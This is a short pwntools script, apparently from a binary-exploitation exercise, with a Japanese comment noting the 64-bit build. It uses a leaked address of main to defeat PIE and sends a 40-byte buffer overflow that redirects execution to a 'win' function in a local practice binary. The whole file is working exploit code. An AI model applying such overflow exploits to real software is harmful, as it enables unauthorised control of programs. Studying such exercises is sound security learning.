# vuln-64はvuln-32と同じソースコードで -m32 オプションをつけないでコンパイル

from pwn import *

elf = context.binary = ELF('./vuln-64')
p = process('./vuln-64')

p.recvuntil(b'at: ')
main = int(p.recvline(), 16)

elf.address = main - elf.sym['main']

payload = b'A' * 40
payload += p64(elf.sym['win'])

p.sendline(payload)
print(p.clean().decode('latin-1'))
